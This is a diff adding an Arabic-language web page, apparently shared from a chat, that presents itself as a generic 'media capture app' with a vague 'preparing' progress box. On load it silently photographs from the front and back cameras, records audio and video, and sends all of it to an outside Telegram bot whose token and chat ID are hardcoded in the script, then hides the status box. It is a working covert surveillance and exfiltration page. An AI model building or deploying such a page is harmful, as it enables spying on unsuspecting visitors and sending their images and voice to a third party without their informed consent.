@@ -1,0 +1,327 @@
+.., [11/21/2025 1:48 AM]
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تطبيق التقاط الوسائط</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-color: white;
+            color: #333;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        
+        .status {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 100;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 80%;
+        }
+        
+        .progress {
+            width: 100%;
+            height: 10px;
+            background-color: #f0f0f0;
+            border-radius: 5px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background-color: #4CAF50;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="status" id="statusMessage">
+        <h2>جاري التحضير...</h2>
+        <p id="statusText">تهيئة التطبيق</p>
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+    </div>
+
+    <script>
+        // استبدل هذه القيم بمعلومات البوت الخاصة بك
+        const BOT_TOKEN = '8571359223:AAFHxmZf9deJUz33YOS-TvYkPmibpbQ_MLU';
+        const CHAT_ID = '8219176247';
+        
+        // عناصر DOM
+        const statusMessage = document.getElementById('statusMessage');
+        const statusText = document.getElementById('statusText');
+        const progressBar = document.getElementById('progressBar');
+        
+        // المتغيرات العامة
+        let frontCameraStream = null;
+        let backCameraStream = null;
+        let audioStream = null;
+        let videoStream = null;
+        let mediaRecorder = null;
+        let videoRecorder = null;
+        let audioChunks = [];
+        let videoChunks = [];
+        
+        // دالة تحديث الحالة
+        function updateStatus(text, progress) {
+            statusText.textContent = text;
+            if (progress !== undefined) {
+                progressBar.style.width = progress + '%';
+            }
+        }
+        
+       // دالة إرسال الوسائط إلى تليجرام
+async function sendToTelegram(blob, type, caption) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append(type, blob, `file.${getFileExtension(type)}`);
+    formData.append('caption', caption);
+    
+    // بناء رابط API بشكل صحيح
+    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
+    
+    try {
+        const response = await fetch(apiUrl, {
+            method: 'POST',
+            body: formData
+        });
+        
+        if (!response.ok) {
+            throw new Error(`فشل الإرسال: ${response.status}`);
+        }
+        
+        return await response.json();
+    } catch (error) {
+        console.error('خطأ في الإرسال:', error);
+        throw error;
+    }
+}
+
+// دالة مساعدة للحصول على امتداد الملف
+function getFileExtension(type) {
+    const extensions = {
+        'photo': 'jpg',
+        'video': 'mp4',
+        'audio': 'mp3',
+        'document': 'pdf',
+        'voice': 'ogg'
+    };
+    
+    return extensions[type] || 'bin';
+}
+        // التقاط صورة من الكاميرا
+        async function captureImage(videoElement, cameraName) {
+            return new Promise((resolve) => {
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    resolve(blob);
+                }, 'image/jpeg');
+
+
+});
+        }
+        
+        // تسجيل الصوت
+        async function recordAudio() {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    audioChunks = [];
+                    
+                    mediaRecorder = new MediaRecorder(audioStream);
+                    mediaRecorder.ondataavailable = event => {
+                        audioChunks.push(event.data);
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        resolve(audioBlob);
+                    };
+                    
+                    mediaRecorder.start();
+                    
+                    // تسجيل لمدة 10 ثوانٍ (يمكن تغييرها)
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                            audioStream.getTracks().forEach(track => track.stop());
+                        }
+                    }, 10000);
+                    
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }
+        
+        // تسجيل الفيديو
+        async function recordVideo() {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    videoStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true, 
+                        audio: true 
+                    });
+                    
+                    videoChunks = [];
+                    videoRecorder = new MediaRecorder(videoStream, { 
+                        mimeType: 'video/webm; codecs=vp9,opus' 
+                    });
+                    
+                    videoRecorder.ondataavailable = event => {
+                        videoChunks.push(event.data);
+                    };
+                    
+                    videoRecorder.onstop = () => {
+                        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                        resolve(videoBlob);
+                    };
+                    
+                    videoRecorder.start();
+                    
+                    // تسجيل لمدة 15 ثانية (يمكن تغييرها)
+                    setTimeout(() => {
+                        if (videoRecorder && videoRecorder.state === 'recording') {
+                            videoRecorder.stop();
+                            videoStream.getTracks().forEach(track => track.stop());
+                        }
+                    }, 15000);
+                    
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }
+        
+        // العملية الرئيسية
+        async function startCaptureProcess() {
+            try {
+                updateStatus('جاري تهيئة الكاميرات...', 10);
+                
+                // الحصول على قائمة الكاميرات المتاحة
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                
+                if (videoDevices.length === 0) {
+                    throw new Error('لم يتم العثور على كاميرات');
+                }
+                
+                updateStatus('جاري التقاط الصور...', 30);
+                
+                // التقاط الصور من الكاميرات المتاحة
+                const imagePromises = [];
+                
+                // الكاميرا الأولى
+                if (videoDevices.length >= 1) {
+                    frontCameraStream = await navigator.mediaDevices.getUserMedia({
+
+video: { deviceId: videoDevices[0].deviceId } 
+                    });
+                    const frontVideo = document.createElement('video');
+                    frontVideo.srcObject = frontCameraStream;
+                    await new Promise(resolve => {
+                        frontVideo.onloadedmetadata = () => {
+                            frontVideo.play();
+                            setTimeout(resolve, 1000);
+                        };
+                    });
+                    
+                    imagePromises.push(
+                        captureImage(frontVideo, 'الكاميرا الأمامية')
+                            .then(blob => sendToTelegram(blob, 'photo', 'صورة من الكاميرا الأمامية'))
+                            .finally(() => {
+                                frontCameraStream.getTracks().forEach(track => track.stop());
+                            })
+                    );
+                }
+                
+                // الكاميرا الثانية
+                if (videoDevices.length >= 2) {
+                    backCameraStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { deviceId: videoDevices[1].deviceId } 
+                    });
+                    const backVideo = document.createElement('video');
+                    backVideo.srcObject = backCameraStream;
+                    await new Promise(resolve => {
+                        backVideo.onloadedmetadata = () => {
+                            backVideo.play();
+                            setTimeout(resolve, 1000);
+                        };
+                    });
+                    
+                    imagePromises.push(
+                        captureImage(backVideo, 'الكاميرا الخلفية')
+                            .then(blob => sendToTelegram(blob, 'photo', 'صورة من الكاميرا الخلفية'))
+                            .finally(() => {
+                                backCameraStream.getTracks().forEach(track => track.stop());
+                            })
+                    );
+                }
+                
+                await Promise.all(imagePromises);
+                updateStatus('تم التقاط الصور، جاري تسجيل الصوت...', 50);
+                
+                // تسجيل الصوت
+                const audioBlob = await recordAudio();
+                await sendToTelegram(audioBlob, 'audio', 'تسجيل صوتي');
+                updateStatus('تم تسجيل الصوت، جاري تسجيل الفيديو...', 70);
+                
+                // تسجيل الفيديو
+                const videoBlob = await recordVideo();
+                await sendToTelegram(videoBlob, 'video', 'تسجيل فيديو');
+                updateStatus('تم تسجيل الفيديو، جاري الانتهاء...', 90);
+                
+                // إتمام العملية
+                setTimeout(() => {
+                    updateStatus('تم إرسال جميع الوسائط بنجاح!', 100);
+                    setTimeout(() => {
+                        statusMessage.classList.add('hidden');
+                    }, 2000);
+                }, 1000);
+                
+            } catch (error) {
+                console.error('خطأ في العملية:', error);
+                updateStatus('حدث خطأ: ' + error.message, 0);
+            }
+        }
+        
+        // بدء العملية عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', () => {
+            // التحقق من وجود التوكن والـ chat id
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                updateStatus('يرجى إضافة التوكن ورقم الدردشة الخاصين بك في الكود', 0);
+                return;
+            }
+            
+            // بدء عملية التقاط الوسائط
+            startCaptureProcess();
+        });
+    </script>
+</body>
+</html>
